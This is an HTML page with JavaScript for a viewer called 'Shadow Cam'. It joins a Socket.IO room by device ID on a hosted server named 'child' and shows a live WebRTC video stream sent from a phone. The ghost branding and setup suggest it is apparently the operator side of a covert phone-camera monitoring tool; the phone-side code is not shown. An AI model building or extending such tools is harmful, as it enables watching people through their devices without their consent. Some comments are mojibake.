<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Live Camera</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root { --bg: #0a0a0a; --accent: #00ff88; --panel: #161616; }
        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
        
        .header { padding: 15px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
        .status { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
        .dot { height: 10px; width: 10px; background: #ff3333; border-radius: 50%; }
        .dot.active { background: var(--accent); box-shadow: 0 0 10px var(--accent); }

        .video-container { 
            width: 100vw; height: calc(100vh - 70px); 
            display: flex; justify-content: center; align-items: center; background: #000;
        }
        
        /* ‡§Ö‡§∏‡§≤‡•Ä ‡§µ‡•Ä‡§°‡§ø‡§Ø‡•ã ‡§™‡•ç‡§≤‡•á‡§Ø‡§∞ */
        #remoteVideo { 
            max-width: 100%; max-height: 100%; 
            border-radius: 10px; transform: rotate(0deg); /* ‡•õ‡§∞‡•Ç‡§∞‡§§ ‡§™‡•ú‡§®‡•á ‡§™‡§∞ ‡§Ø‡§π‡§æ‡§Å ‡§∏‡•á ‡§ò‡•Å‡§Æ‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•ã */
        }

        .no-video { position: absolute; color: #444; text-align: center; }
        
        .controls { 
            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 20px; background: rgba(0,0,0,0.6); padding: 15px 30px;
            border-radius: 50px; backdrop-filter: blur(10px); border: 1px solid #444;
        }
        .btn { color: white; font-size: 1.5rem; cursor: pointer; transition: 0.3s; }
        .btn:hover { color: var(--accent); scale: 1.2; }
    </style>
</head>
<body>

    <div class="header">
        <div style="color: var(--accent); font-weight: bold;"><i class="fa-solid fa-ghost"></i> SHADOW CAM</div>
        <div class="status">
            <span id="stat-dot" class="dot"></span>
            <span id="stat-text">Connecting Server...</span>
        </div>
    </div>

    <div class="video-container">
        <div id="loader" class="no-video">
            <i class="fa-solid fa-circle-notch fa-spin fa-3x"></i>
            <p>Waiting for Phone Stream...</p>
        </div>
        <video id="remoteVideo" autoplay playsinline></video>
    </div>

    <div class="controls">
        <div class="btn" onclick="location.reload()" title="Refresh"><i class="fa-solid fa-rotate"></i></div>
        <div class="btn" style="color: #ff3333;" onclick="window.close()" title="Stop"><i class="fa-solid fa-circle-stop"></i></div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        let socket, peerConnection;
        let deviceId = new URLSearchParams(window.location.search).get('id');

        const config = {
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        };

        if (!deviceId) {
            document.getElementById('stat-text').innerText = "ERROR: No ID Found";
        } else {
            init();
        }

        function init() {
            socket = io(SERVER_URL);
            
            socket.on("connect", () => {
                document.getElementById('stat-dot').classList.add('active');
                document.getElementById('stat-text').innerText = "Online: " + deviceId;
                socket.emit("join", deviceId);
                console.log("Joined room:", deviceId);
            });

            // üî• PHONE SE OFFER AAYEGA
            socket.on("offer", async (data) => {
                console.log("Offer Received from phone");
                document.getElementById('loader').style.display = 'none';
                
                peerConnection = new RTCPeerConnection(config);

                // Jab video track mil jaye
                peerConnection.ontrack = (event) => {
                    console.log("Got Track!");
                    const video = document.getElementById('remoteVideo');
                    if (video.srcObject !== event.streams[0]) {
                        video.srcObject = event.streams[0];
                    }
                };

                // ICE Candidates bhejna
                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        socket.emit("candidate", { room: deviceId, candidate: event.candidate });
                    }
                };

                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer || data));
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);

                socket.emit("answer", { room: deviceId, answer: answer });
            });

            // Candidate handle karna
            socket.on("candidate", async (data) => {
                try {
                    if (peerConnection) {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
                    }
                } catch (e) { console.error(e); }
            });

            socket.on("disconnect", () => {
                document.getElementById('stat-dot').classList.remove('active');
                document.getElementById('stat-text').innerText = "Server Disconnected";
            });
        }
    </script>
</body>
</html>
